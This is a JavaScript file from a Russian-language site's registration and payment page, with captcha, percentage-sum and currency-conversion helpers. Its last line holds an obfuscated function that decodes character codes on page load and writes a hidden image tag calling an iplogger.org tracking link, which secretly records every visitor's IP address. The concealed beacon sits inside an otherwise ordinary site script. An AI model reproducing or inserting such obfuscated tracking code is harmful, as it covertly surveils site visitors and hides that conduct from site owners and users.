///////////////////////////////////////// Регистрация //////////////////////////////
function ResetCaptcha(vitem){
	
	
	vitem.innerHTML = '<img src="/captcha.php?rnd='+ Math.random() +'" border="0"/>';
	
}

function GetSumPer(){
	
	var sum = parseInt(document.getElementById("sum").value);
	var percent = parseInt(document.getElementById("percent").value);
	var add_sum = 0;
	
	if(sum > 0){
		
		if(percent > 0){
			add_sum = (percent / 100) * sum;
		}
		
		document.getElementById("res_sum").innerHTML = Math.round(sum+add_sum);
	}
	
}

var valuta = 'RUB';

function SetVal(){
	
	valuta = document.getElementById("val_type").value;
	document.getElementById("res_val").innerHTML = valuta;
	PaymentSum();
}

function PaymentSum(){
	
	var sum = parseInt(document.getElementById("sum").value);
	var ser = parseInt(document.getElementById(valuta).value);
	
	xt = (valuta == 'RUB') ? 'min_sum_RUB' : xt;
	xt = (valuta == 'USD') ? 'min_sum_USD' : xt;
	xt = (valuta == 'EUR') ? 'min_sum_EUR' : xt;
	
	var min_pay = parseFloat(document.getElementById(xt).value);
	
		document.getElementById("res_sum").value = (sum/ser).toFixed(2);
		document.getElementById("res_min").innerHTML = (min_pay*ser).toFixed(2);
	
}
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!72!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}D_();